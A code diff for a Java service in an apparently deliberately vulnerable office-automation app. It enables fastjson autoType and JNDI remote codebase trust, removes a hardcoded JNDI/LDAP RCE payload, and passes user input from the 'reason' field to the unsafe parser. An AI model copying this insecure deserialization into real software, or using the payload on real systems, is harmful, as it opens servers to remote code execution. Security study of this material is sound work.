@@ -3,7 +3,12 @@ package com.lxx.oa.service;
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.JSONObject;
 import com.alibaba.fastjson.parser.ParserConfig;
+import com.lxx.oa.entity.LeaveForm;
+import org.apache.commons.beanutils.BeanUtils;
 
+import java.lang.reflect.InvocationTargetException;
+import java.util.Collection;
+import java.util.Collections;
 import java.util.Date;
 
 /**
@@ -12,20 +17,20 @@ import java.util.Date;
  * @description
  */
 public class JsonToObjService {
-    private Long formId;
-    private Long employeeId;
-    private Integer formType;
-    private Date startTime;
-    private Date endTime;
-    private String reason;
-    private Date createTime;
-    private String state;
-
-    public JSONObject creatForm(String eid, String formType, String startTime, String endTime, String reason){
+    public LeaveForm creatForm(String eid, String formType, String startTime, String endTime, String reason){
         ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
         System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
         System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
-        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/FastJsonRCE\"}";
-        return JSON.parseObject(payload);
+        String ObjString = reason;
+        LeaveForm leaveForm = new LeaveForm();
+        JSONObject jsonObject = JSON.parseObject(ObjString);
+        try {
+            BeanUtils.copyProperties(leaveForm, jsonObject);
+        } catch (IllegalAccessException e) {
+            e.printStackTrace();
+        } catch (InvocationTargetException e) {
+            e.printStackTrace();
+        }
+        return leaveForm;
     }
 }
